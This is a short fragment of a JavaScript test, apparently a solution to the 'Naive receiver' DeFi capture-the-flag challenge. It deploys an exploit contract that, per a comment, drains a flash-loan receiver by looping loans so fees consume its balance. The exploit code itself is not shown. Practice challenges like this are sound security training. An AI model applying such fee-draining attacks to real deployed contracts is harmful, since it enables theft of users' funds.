...
describe('[Challenge] Naive receiver', function () {
    ...
    it('Exploit', async function () {
        ...
        //Drying up the receiver with looping up in a contract and drying it up with fees
        const ExploitContract = await ethers.getContractFactory("NaiveLenderExploit", attacker);
        this.exploit = await ExploitContract.deploy(this.receiver.address, this.pool.address);
